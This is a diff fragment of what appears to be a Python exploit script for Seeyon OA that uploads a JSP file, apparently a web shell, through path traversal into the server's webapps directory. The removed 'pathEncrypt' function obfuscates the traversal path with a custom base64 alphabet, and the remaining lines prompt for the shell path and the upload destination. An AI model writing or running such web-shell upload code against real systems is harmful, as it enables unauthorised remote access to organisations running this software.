@@ -45,18 +45,6 @@ else:
     print('no shell_path input, exit!')
     exit(0)
 
-
-
-def pathEncrypt(path=r'..\..\..\ApacheJetspeed\webapps\seeyon\test666666.jsp'):
-    import base64
-    a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
-    b = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
-    out = ''
-    str = base64.b64encode(path.encode()).decode()
-    for i in str:
-        out += b[a.index(i)]
-    return out
-
 file_name = input(r"上传路径（默认为'..\..\..\ApacheJetspeed\webapps\seeyon\test666666.jsp'）：")
 
 if file_name:
